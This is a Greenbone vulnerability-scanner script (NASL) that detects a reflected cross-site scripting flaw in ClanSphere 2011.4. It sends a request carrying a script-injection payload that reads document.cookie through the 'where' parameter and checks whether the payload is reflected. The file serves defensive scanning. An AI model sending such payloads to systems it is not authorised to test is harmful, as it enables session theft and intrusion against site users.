if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805130" );
	script_version( "2020-10-29T15:35:19+0000" );
	script_cve_id( "CVE-2014-100010" );
	script_bugtraq_id( 66058 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-10-29 15:35:19 +0000 (Thu, 29 Oct 2020)" );
	script_tag( name: "creation_date", value: "2015-01-23 17:16:23 +0530 (Fri, 23 Jan 2015)" );
	script_name( "ClanSphere 'where' Parameter Cross-Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "The host is installed with ClanSphere
  and is prone to an XSS vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Input passed via the 'where' parameter to
  '/index.php' is not properly sanitised before being returned to the user." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a users browser session
  in the context of an affected site." );
	script_tag( name: "affected", value: "ClanSphere version 2011.4, Prior versions
  may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/57306" );
	script_xref( name: "URL", value: "https://www.httpcs.com/advisory/httpcs127" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2014/Mar/73" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/archive/1/531373/100/0/threaded" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/clansphere", "/cms", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/index.php" ), port: http_port );
	if(ContainsString( rcvRes, ">csphere" ) && ContainsString( rcvRes, "Seitentitel. All rights reserved" )){
		url = dir + "/index.php?sort=6&action=list&where=\"><script>" + "alert(document.cookie)</script>&mod=users";
		if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>", extra_check: ">csphere" )){
			report = http_report_vuln_url( port: http_port, url: url );
			security_message( port: http_port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

